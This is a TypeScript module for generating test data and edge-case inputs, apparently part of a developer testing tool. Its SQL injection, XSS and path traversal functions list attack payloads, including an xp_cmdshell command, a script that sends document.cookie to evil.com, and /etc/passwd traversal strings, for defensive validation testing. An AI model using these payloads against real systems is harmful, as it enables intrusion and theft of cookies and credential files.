/**
 * Data Generation Tools - Free Tier
 *
 * Generate realistic test data without AI.
 * Uses pattern-based generation and faker-style algorithms.
 */

// ============================================================================
// Types
// ============================================================================

export type DataType =
  | 'name'
  | 'firstName'
  | 'lastName'
  | 'email'
  | 'phone'
  | 'address'
  | 'city'
  | 'state'
  | 'zipCode'
  | 'country'
  | 'company'
  | 'jobTitle'
  | 'username'
  | 'password'
  | 'uuid'
  | 'date'
  | 'pastDate'
  | 'futureDate'
  | 'number'
  | 'integer'
  | 'float'
  | 'boolean'
  | 'url'
  | 'ipv4'
  | 'ipv6'
  | 'creditCard'
  | 'color'
  | 'word'
  | 'sentence'
  | 'paragraph'
  | 'json';

export interface GenerateDataOptions {
  type: DataType;
  count?: number;
  locale?: 'en' | 'es' | 'fr' | 'de';
  options?: Record<string, unknown>;
}

export interface GenerateDataResult {
  data: unknown[];
  type: DataType;
  count: number;
}

export type EdgeCaseType =
  | 'string'
  | 'number'
  | 'email'
  | 'url'
  | 'phone'
  | 'date'
  | 'password'
  | 'json'
  | 'sql'
  | 'xss'
  | 'path';

export interface EdgeCaseOptions {
  type: EdgeCaseType;
  includeValid?: boolean;
  includeMalicious?: boolean;
}

export interface EdgeCase {
  value: unknown;
  category: 'boundary' | 'invalid' | 'malicious' | 'unicode' | 'empty' | 'valid';
  description: string;
}

export interface EdgeCaseResult {
  type: EdgeCaseType;
  cases: EdgeCase[];
  count: number;
}

export interface SchemaField {
  name: string;
  type: 'string' | 'number' | 'integer' | 'boolean' | 'array' | 'object' | 'null';
  format?: string;  // email, uri, date, date-time, uuid, etc.
  pattern?: string;
  minimum?: number;
  maximum?: number;
  minLength?: number;
  maxLength?: number;
  enum?: unknown[];
  required?: boolean;
  properties?: Record<string, SchemaField>;
  items?: SchemaField;
}

export interface FromSchemaOptions {
  schema: SchemaField | Record<string, SchemaField>;
  count?: number;
}

export interface FromSchemaResult {
  data: Record<string, unknown>[];
  count: number;
}

// ============================================================================
// Data Sets
// ============================================================================

const FIRST_NAMES = [
  'James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda',
  'William', 'Elizabeth', 'David', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Jessica',
  'Thomas', 'Sarah', 'Charles', 'Karen', 'Christopher', 'Lisa', 'Daniel', 'Nancy',
  'Alex', 'Jordan', 'Taylor', 'Casey', 'Morgan', 'Riley', 'Avery', 'Quinn',
];

const LAST_NAMES = [
  'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis',
  'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson',
  'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson',
  'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker',
];

const COMPANIES = [
  'Acme Corp', 'TechFlow', 'DataSync', 'CloudBase', 'ByteWorks', 'CodeCraft',
  'PixelPerfect', 'InnovateLabs', 'FutureTech', 'SmartSolutions', 'NextGen Systems',
  'DigitalEdge', 'CyberCore', 'LogicWorks', 'AgileMinds', 'PrimeTech',
];

const JOB_TITLES = [
  'Software Engineer', 'Product Manager', 'Designer', 'Data Analyst', 'DevOps Engineer',
  'QA Engineer', 'Tech Lead', 'Architect', 'Consultant', 'Director', 'VP of Engineering',
  'CTO', 'Developer', 'Full Stack Developer', 'Frontend Developer', 'Backend Developer',
];

const CITIES = [
  'New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia',
  'San Antonio', 'San Diego', 'Dallas', 'San Jose', 'Austin', 'Jacksonville',
  'Fort Worth', 'Columbus', 'Charlotte', 'San Francisco', 'Seattle', 'Denver',
];

const STATES = [
  'CA', 'TX', 'FL', 'NY', 'PA', 'IL', 'OH', 'GA', 'NC', 'MI',
  'NJ', 'VA', 'WA', 'AZ', 'MA', 'TN', 'IN', 'MO', 'MD', 'WI',
];

const STREETS = [
  'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Park Blvd', 'Washington Ave',
  'Lincoln Way', 'Jefferson St', 'Broadway', 'First St', 'Second Ave', 'Third Blvd',
];

const WORDS = [
  'lorem', 'ipsum', 'dolor', 'sit', 'amet', 'consectetur', 'adipiscing', 'elit',
  'sed', 'do', 'eiusmod', 'tempor', 'incididunt', 'ut', 'labore', 'et', 'dolore',
  'magna', 'aliqua', 'enim', 'ad', 'minim', 'veniam', 'quis', 'nostrud',
];

const DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'example.com', 'test.com'];

// ============================================================================
// Data Generation
// ============================================================================

/**
 * Generate realistic test data
 */
export function generateData(options: GenerateDataOptions): GenerateDataResult {
  const { type, count = 1, locale = 'en' } = options;
  const data: unknown[] = [];

  for (let i = 0; i < count; i++) {
    data.push(generateSingleValue(type, options.options));
  }

  return { data, type, count };
}

function generateSingleValue(type: DataType, opts?: Record<string, unknown>): unknown {
  switch (type) {
    case 'name':
      return `${randomItem(FIRST_NAMES)} ${randomItem(LAST_NAMES)}`;

    case 'firstName':
      return randomItem(FIRST_NAMES);

    case 'lastName':
      return randomItem(LAST_NAMES);

    case 'email': {
      const first = randomItem(FIRST_NAMES).toLowerCase();
      const last = randomItem(LAST_NAMES).toLowerCase();
      const domain = randomItem(DOMAINS);
      const num = randomInt(1, 999);
      return `${first}.${last}${num}@${domain}`;
    }

    case 'phone': {
      const area = randomInt(200, 999);
      const prefix = randomInt(200, 999);
      const line = randomInt(1000, 9999);
      return `(${area}) ${prefix}-${line}`;
    }

    case 'address': {
      const num = randomInt(100, 9999);
      const street = randomItem(STREETS);
      return `${num} ${street}`;
    }

    case 'city':
      return randomItem(CITIES);

    case 'state':
      return randomItem(STATES);

    case 'zipCode':
      return String(randomInt(10000, 99999));

    case 'country':
      return 'United States';

    case 'company':
      return randomItem(COMPANIES);

    case 'jobTitle':
      return randomItem(JOB_TITLES);

    case 'username': {
      const first = randomItem(FIRST_NAMES).toLowerCase();
      const num = randomInt(1, 9999);
      return `${first}${num}`;
    }

    case 'password': {
      const length = (opts?.length as number) || 12;
      return generatePassword(length);
    }

    case 'uuid':
      return generateUUID();

    case 'date': {
      const start = new Date(2020, 0, 1);
      const end = new Date(2025, 11, 31);
      return randomDate(start, end).toISOString().split('T')[0];
    }

    case 'pastDate': {
      const now = new Date();
      const past = new Date(now.getTime() - 365 * 24 * 60 * 60 * 1000);
      return randomDate(past, now).toISOString().split('T')[0];
    }

    case 'futureDate': {
      const now = new Date();
      const future = new Date(now.getTime() + 365 * 24 * 60 * 60 * 1000);
      return randomDate(now, future).toISOString().split('T')[0];
    }

    case 'number':
      return randomInt((opts?.min as number) ?? 0, (opts?.max as number) ?? 1000);

    case 'integer':
      return randomInt((opts?.min as number) ?? 0, (opts?.max as number) ?? 100);

    case 'float': {
      const min = (opts?.min as number) ?? 0;
      const max = (opts?.max as number) ?? 100;
      return Math.round((Math.random() * (max - min) + min) * 100) / 100;
    }

    case 'boolean':
      return Math.random() > 0.5;

    case 'url': {
      const protocol = 'https';
      const domain = `${randomItem(WORDS)}-${randomItem(WORDS)}.com`;
      const path = `/${randomItem(WORDS)}/${randomItem(WORDS)}`;
      return `${protocol}://${domain}${path}`;
    }

    case 'ipv4':
      return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;

    case 'ipv6': {
      const parts = Array.from({ length: 8 }, () =>
        randomInt(0, 65535).toString(16).padStart(4, '0')
      );
      return parts.join(':');
    }

    case 'creditCard': {
      // Generates a valid-looking (but not valid) card number
      const prefix = '4'; // Visa-like
      let number = prefix;
      for (let i = 0; i < 15; i++) {
        number += randomInt(0, 9);
      }
      return number;
    }

    case 'color':
      return `#${randomInt(0, 16777215).toString(16).padStart(6, '0')}`;

    case 'word':
      return randomItem(WORDS);

    case 'sentence': {
      const wordCount = randomInt(5, 12);
      const words = Array.from({ length: wordCount }, () => randomItem(WORDS));
      words[0] = words[0].charAt(0).toUpperCase() + words[0].slice(1);
      return words.join(' ') + '.';
    }

    case 'paragraph': {
      const sentenceCount = randomInt(3, 6);
      const sentences = Array.from({ length: sentenceCount }, () =>
        generateSingleValue('sentence') as string
      );
      return sentences.join(' ');
    }

    case 'json':
      return {
        id: generateUUID(),
        name: `${randomItem(FIRST_NAMES)} ${randomItem(LAST_NAMES)}`,
        email: generateSingleValue('email'),
        active: Math.random() > 0.5,
        score: randomInt(0, 100),
      };

    default:
      return null;
  }
}

// ============================================================================
// Edge Case Generation
// ============================================================================

/**
 * Generate edge cases for testing
 */
export function generateEdgeCases(options: EdgeCaseOptions): EdgeCaseResult {
  const { type, includeValid = true, includeMalicious = true } = options;
  const cases: EdgeCase[] = [];

  switch (type) {
    case 'string':
      cases.push(...getStringEdgeCases(includeValid, includeMalicious));
      break;
    case 'number':
      cases.push(...getNumberEdgeCases(includeValid));
      break;
    case 'email':
      cases.push(...getEmailEdgeCases(includeValid, includeMalicious));
      break;
    case 'url':
      cases.push(...getUrlEdgeCases(includeValid, includeMalicious));
      break;
    case 'phone':
      cases.push(...getPhoneEdgeCases(includeValid));
      break;
    case 'date':
      cases.push(...getDateEdgeCases(includeValid));
      break;
    case 'password':
      cases.push(...getPasswordEdgeCases(includeValid));
      break;
    case 'json':
      cases.push(...getJsonEdgeCases(includeValid));
      break;
    case 'sql':
      cases.push(...getSqlInjectionCases());
      break;
    case 'xss':
      cases.push(...getXssCases());
      break;
    case 'path':
      cases.push(...getPathTraversalCases());
      break;
  }

  return { type, cases, count: cases.length };
}

function getStringEdgeCases(includeValid: boolean, includeMalicious: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty string' },
    { value: ' ', category: 'empty', description: 'Single space' },
    { value: '   ', category: 'empty', description: 'Multiple spaces' },
    { value: '\t\n\r', category: 'empty', description: 'Whitespace characters' },
    { value: null, category: 'empty', description: 'Null value' },
    { value: undefined, category: 'empty', description: 'Undefined value' },
    { value: 'a'.repeat(1000), category: 'boundary', description: 'Very long string (1000 chars)' },
    { value: 'a'.repeat(10000), category: 'boundary', description: 'Extremely long string (10000 chars)' },
    { value: '日本語テスト', category: 'unicode', description: 'Japanese characters' },
    { value: '中文测试', category: 'unicode', description: 'Chinese characters' },
    { value: 'العربية', category: 'unicode', description: 'Arabic characters' },
    { value: '🎉🚀💻', category: 'unicode', description: 'Emoji characters' },
    { value: 'Test\u0000Value', category: 'unicode', description: 'Null byte in string' },
    { value: 'Test\u200BValue', category: 'unicode', description: 'Zero-width space' },
    { value: '‮Reversed‬', category: 'unicode', description: 'Right-to-left override' },
  ];

  if (includeValid) {
    cases.push({ value: 'ValidString123', category: 'valid', description: 'Normal alphanumeric string' });
  }

  return cases;
}

function getNumberEdgeCases(includeValid: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: 0, category: 'boundary', description: 'Zero' },
    { value: -1, category: 'boundary', description: 'Negative one' },
    { value: -0, category: 'boundary', description: 'Negative zero' },
    { value: Number.MAX_SAFE_INTEGER, category: 'boundary', description: 'Max safe integer' },
    { value: Number.MIN_SAFE_INTEGER, category: 'boundary', description: 'Min safe integer' },
    { value: Number.MAX_VALUE, category: 'boundary', description: 'Max value' },
    { value: Number.MIN_VALUE, category: 'boundary', description: 'Min positive value' },
    { value: Infinity, category: 'boundary', description: 'Infinity' },
    { value: -Infinity, category: 'boundary', description: 'Negative infinity' },
    { value: NaN, category: 'invalid', description: 'NaN' },
    { value: 0.1 + 0.2, category: 'boundary', description: 'Floating point precision (0.1 + 0.2)' },
    { value: 1e308, category: 'boundary', description: 'Very large number' },
    { value: 1e-308, category: 'boundary', description: 'Very small number' },
    { value: '123', category: 'invalid', description: 'Number as string' },
    { value: '12.34', category: 'invalid', description: 'Float as string' },
  ];

  if (includeValid) {
    cases.push({ value: 42, category: 'valid', description: 'Normal positive integer' });
    cases.push({ value: 3.14, category: 'valid', description: 'Normal float' });
  }

  return cases;
}

function getEmailEdgeCases(includeValid: boolean, includeMalicious: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty email' },
    { value: 'notanemail', category: 'invalid', description: 'No @ symbol' },
    { value: '@nodomain.com', category: 'invalid', description: 'No local part' },
    { value: 'nohost@', category: 'invalid', description: 'No domain' },
    { value: 'spaces in@email.com', category: 'invalid', description: 'Spaces in email' },
    { value: 'double@@at.com', category: 'invalid', description: 'Double @ symbol' },
    { value: '.starts.with.dot@email.com', category: 'invalid', description: 'Starts with dot' },
    { value: 'ends.with.dot.@email.com', category: 'invalid', description: 'Ends with dot' },
    { value: 'a@b.c', category: 'boundary', description: 'Minimum valid-looking email' },
    { value: `${'a'.repeat(64)}@${'b'.repeat(255)}.com`, category: 'boundary', description: 'Maximum length email' },
    { value: 'test+tag@email.com', category: 'valid', description: 'Email with plus tag' },
    { value: 'test.email@subdomain.domain.com', category: 'valid', description: 'Email with subdomain' },
  ];

  if (includeValid) {
    cases.push({ value: 'user@example.com', category: 'valid', description: 'Standard email' });
  }

  if (includeMalicious) {
    cases.push({ value: 'test@evil.com<script>alert(1)</script>', category: 'malicious', description: 'XSS in email' });
  }

  return cases;
}

function getUrlEdgeCases(includeValid: boolean, includeMalicious: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty URL' },
    { value: 'notaurl', category: 'invalid', description: 'No protocol' },
    { value: 'http://', category: 'invalid', description: 'Protocol only' },
    { value: 'http://localhost', category: 'boundary', description: 'Localhost' },
    { value: 'http://127.0.0.1', category: 'boundary', description: 'Loopback IP' },
    { value: 'http://[::1]', category: 'boundary', description: 'IPv6 loopback' },
    { value: 'http://example.com:99999', category: 'invalid', description: 'Invalid port' },
    { value: 'file:///etc/passwd', category: 'malicious', description: 'File protocol' },
    { value: 'javascript:alert(1)', category: 'malicious', description: 'JavaScript protocol' },
    { value: 'data:text/html,<script>alert(1)</script>', category: 'malicious', description: 'Data URL with script' },
  ];

  if (includeValid) {
    cases.push({ value: 'https://example.com', category: 'valid', description: 'Standard HTTPS URL' });
    cases.push({ value: 'https://example.com/path?query=value#hash', category: 'valid', description: 'URL with path, query, hash' });
  }

  return cases;
}

function getPhoneEdgeCases(includeValid: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty phone' },
    { value: '123', category: 'invalid', description: 'Too short' },
    { value: '1'.repeat(20), category: 'invalid', description: 'Too long' },
    { value: 'abc-def-ghij', category: 'invalid', description: 'Letters instead of digits' },
    { value: '000-000-0000', category: 'boundary', description: 'All zeros' },
    { value: '999-999-9999', category: 'boundary', description: 'All nines' },
    { value: '+1-555-123-4567', category: 'valid', description: 'International format' },
    { value: '(555) 123-4567', category: 'valid', description: 'US format with parens' },
  ];

  if (includeValid) {
    cases.push({ value: '555-123-4567', category: 'valid', description: 'Standard US phone' });
  }

  return cases;
}

function getDateEdgeCases(includeValid: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty date' },
    { value: '0000-00-00', category: 'invalid', description: 'Zero date' },
    { value: '2024-13-01', category: 'invalid', description: 'Invalid month (13)' },
    { value: '2024-02-30', category: 'invalid', description: 'Invalid day (Feb 30)' },
    { value: '1970-01-01', category: 'boundary', description: 'Unix epoch' },
    { value: '2038-01-19', category: 'boundary', description: 'Near Y2038 problem' },
    { value: '9999-12-31', category: 'boundary', description: 'Far future date' },
    { value: '0001-01-01', category: 'boundary', description: 'Very old date' },
    { value: '2024-02-29', category: 'valid', description: 'Leap year date' },
    { value: '2023-02-29', category: 'invalid', description: 'Invalid leap year date' },
  ];

  if (includeValid) {
    cases.push({ value: new Date().toISOString().split('T')[0], category: 'valid', description: 'Today' });
  }

  return cases;
}

function getPasswordEdgeCases(includeValid: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty password' },
    { value: 'a', category: 'boundary', description: 'Single character' },
    { value: 'password', category: 'invalid', description: 'Common password' },
    { value: '12345678', category: 'invalid', description: 'Numbers only' },
    { value: 'abcdefgh', category: 'invalid', description: 'Lowercase only' },
    { value: 'ABCDEFGH', category: 'invalid', description: 'Uppercase only' },
    { value: 'a'.repeat(100), category: 'boundary', description: 'Very long password' },
    { value: '!@#$%^&*()', category: 'boundary', description: 'Special characters only' },
    { value: 'pass word', category: 'boundary', description: 'Password with space' },
    { value: 'пароль123', category: 'unicode', description: 'Cyrillic characters' },
  ];

  if (includeValid) {
    cases.push({ value: 'SecureP@ss123!', category: 'valid', description: 'Strong password' });
  }

  return cases;
}

function getJsonEdgeCases(includeValid: boolean): EdgeCase[] {
  const cases: EdgeCase[] = [
    { value: '', category: 'empty', description: 'Empty string' },
    { value: '{}', category: 'valid', description: 'Empty object' },
    { value: '[]', category: 'valid', description: 'Empty array' },
    { value: 'null', category: 'valid', description: 'Null value' },
    { value: '{invalid}', category: 'invalid', description: 'Invalid JSON' },
    { value: '{"key":}', category: 'invalid', description: 'Missing value' },
    { value: '{key: "value"}', category: 'invalid', description: 'Unquoted key' },
    { value: '{"a":{"b":{"c":{"d":{"e":"deep"}}}}}', category: 'boundary', description: 'Deeply nested' },
    { value: `{"data":"${'a'.repeat(10000)}"}`, category: 'boundary', description: 'Large value' },
    { value: '[1,2,3,'.repeat(100) + '4]', category: 'boundary', description: 'Large array' },
  ];

  if (includeValid) {
    cases.push({ value: '{"name":"test","value":123}', category: 'valid', description: 'Simple valid JSON' });
  }

  return cases;
}

function getSqlInjectionCases(): EdgeCase[] {
  return [
    { value: "' OR '1'='1", category: 'malicious', description: 'Classic SQL injection' },
    { value: "1; DROP TABLE users--", category: 'malicious', description: 'Drop table injection' },
    { value: "' UNION SELECT * FROM users--", category: 'malicious', description: 'Union injection' },
    { value: "admin'--", category: 'malicious', description: 'Comment injection' },
    { value: "1' AND '1'='1", category: 'malicious', description: 'Boolean injection' },
    { value: "'; EXEC xp_cmdshell('dir');--", category: 'malicious', description: 'Command execution' },
    { value: "' OR 1=1 LIMIT 1--", category: 'malicious', description: 'Limit bypass' },
    { value: "admin' AND SLEEP(5)--", category: 'malicious', description: 'Time-based blind injection' },
    { value: "\\'; DROP TABLE users;--", category: 'malicious', description: 'Escaped quote injection' },
    { value: "1 OR 1=1", category: 'malicious', description: 'Numeric injection' },
  ];
}

function getXssCases(): EdgeCase[] {
  return [
    { value: '<script>alert(1)</script>', category: 'malicious', description: 'Basic script tag' },
    { value: '<img src=x onerror=alert(1)>', category: 'malicious', description: 'Event handler XSS' },
    { value: '<svg onload=alert(1)>', category: 'malicious', description: 'SVG XSS' },
    { value: 'javascript:alert(1)', category: 'malicious', description: 'JavaScript URL' },
    { value: '<body onload=alert(1)>', category: 'malicious', description: 'Body onload' },
    { value: '<iframe src="javascript:alert(1)">', category: 'malicious', description: 'Iframe XSS' },
    { value: '"><script>alert(1)</script>', category: 'malicious', description: 'Attribute breakout' },
    { value: "'-alert(1)-'", category: 'malicious', description: 'Quote breakout' },
    { value: '<script>fetch("http://evil.com?c="+document.cookie)</script>', category: 'malicious', description: 'Cookie theft' },
    { value: '<div style="background:url(javascript:alert(1))">', category: 'malicious', description: 'CSS XSS' },
  ];
}

function getPathTraversalCases(): EdgeCase[] {
  return [
    { value: '../../../etc/passwd', category: 'malicious', description: 'Unix path traversal' },
    { value: '..\\..\\..\\windows\\system32\\config\\sam', category: 'malicious', description: 'Windows path traversal' },
    { value: '....//....//....//etc/passwd', category: 'malicious', description: 'Double encoding' },
    { value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd', category: 'malicious', description: 'URL encoded traversal' },
    { value: '..%252f..%252f..%252fetc/passwd', category: 'malicious', description: 'Double URL encoded' },
    { value: '/etc/passwd%00.jpg', category: 'malicious', description: 'Null byte injection' },
    { value: '....\\....\\....\\etc/passwd', category: 'malicious', description: 'Mixed slashes' },
    { value: 'file:///etc/passwd', category: 'malicious', description: 'File protocol' },
    { value: '..../....//....//etc/passwd', category: 'malicious', description: 'Recursive bypass' },
    { value: '/var/www/../../etc/passwd', category: 'malicious', description: 'Absolute with traversal' },
  ];
}

// ============================================================================
// Schema-Based Generation
// ============================================================================

/**
 * Generate data from JSON schema
 */
export function generateFromSchema(options: FromSchemaOptions): FromSchemaResult {
  const { schema, count = 1 } = options;
  const data: Record<string, unknown>[] = [];

  for (let i = 0; i < count; i++) {
    const item: Record<string, unknown> = {};

    // Handle schema as either a single field definition or an object with properties
    const properties = 'properties' in schema
      ? (schema as SchemaField).properties || {}
      : schema as Record<string, SchemaField>;

    for (const [key, fieldDef] of Object.entries(properties)) {
      item[key] = generateFromField(fieldDef);
    }

    data.push(item);
  }

  return { data, count };
}

function generateFromField(field: SchemaField): unknown {
  // Handle enums
  if (field.enum && field.enum.length > 0) {
    return randomItem(field.enum);
  }

  // Handle by format first
  if (field.format) {
    switch (field.format) {
      case 'email':
        return generateSingleValue('email');
      case 'uri':
      case 'url':
        return generateSingleValue('url');
      case 'uuid':
        return generateSingleValue('uuid');
      case 'date':
        return generateSingleValue('date');
      case 'date-time':
        return new Date().toISOString();
      case 'ipv4':
        return generateSingleValue('ipv4');
      case 'ipv6':
        return generateSingleValue('ipv6');
    }
  }

  // Handle by type
  switch (field.type) {
    case 'string': {
      if (field.pattern) {
        // Simple pattern matching for common cases
        return generateFromPattern(field.pattern);
      }
      const minLen = field.minLength || 1;
      const maxLen = field.maxLength || 50;
      const len = randomInt(minLen, maxLen);
      return 'a'.repeat(len);
    }

    case 'number':
    case 'integer': {
      const min = field.minimum ?? 0;
      const max = field.maximum ?? 100;
      if (field.type === 'integer') {
        return randomInt(min, max);
      }
      return Math.round((Math.random() * (max - min) + min) * 100) / 100;
    }

    case 'boolean':
      return Math.random() > 0.5;

    case 'array': {
      if (field.items) {
        const count = randomInt(1, 5);
        return Array.from({ length: count }, () => generateFromField(field.items!));
      }
      return [];
    }

    case 'object': {
      if (field.properties) {
        const obj: Record<string, unknown> = {};
        for (const [key, prop] of Object.entries(field.properties)) {
          obj[key] = generateFromField(prop);
        }
        return obj;
      }
      return {};
    }

    case 'null':
      return null;

    default:
      return null;
  }
}

function generateFromPattern(pattern: string): string {
  // Very simplified pattern support
  if (pattern.includes('[a-z]')) {
    return randomItem(WORDS);
  }
  if (pattern.includes('[0-9]')) {
    return String(randomInt(0, 999));
  }
  return 'generated';
}

// ============================================================================
// Utility Functions
// ============================================================================

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomItem<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomDate(start: Date, end: Date): Date {
  return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
}

function generatePassword(length: number): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
  let password = '';
  for (let i = 0; i < length; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

function generateUUID(): string {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================================================
// Formatters
// ============================================================================

export function formatDataResult(result: GenerateDataResult): string {
  const lines: string[] = [];
  lines.push(`# Generated ${result.type} Data (${result.count} items)`);
  lines.push('');
  lines.push('```json');
  lines.push(JSON.stringify(result.data, null, 2));
  lines.push('```');
  return lines.join('\n');
}

export function formatEdgeCaseResult(result: EdgeCaseResult): string {
  const lines: string[] = [];
  lines.push(`# Edge Cases for ${result.type} (${result.count} cases)`);
  lines.push('');

  const categories = ['valid', 'boundary', 'empty', 'invalid', 'unicode', 'malicious'];
  for (const cat of categories) {
    const cases = result.cases.filter(c => c.category === cat);
    if (cases.length > 0) {
      lines.push(`## ${cat.charAt(0).toUpperCase() + cat.slice(1)}`);
      for (const c of cases) {
        const val = typeof c.value === 'string' ? `"${c.value}"` : String(c.value);
        lines.push(`- ${c.description}: \`${val.substring(0, 50)}${val.length > 50 ? '...' : ''}\``);
      }
      lines.push('');
    }
  }

  return lines.join('\n');
}
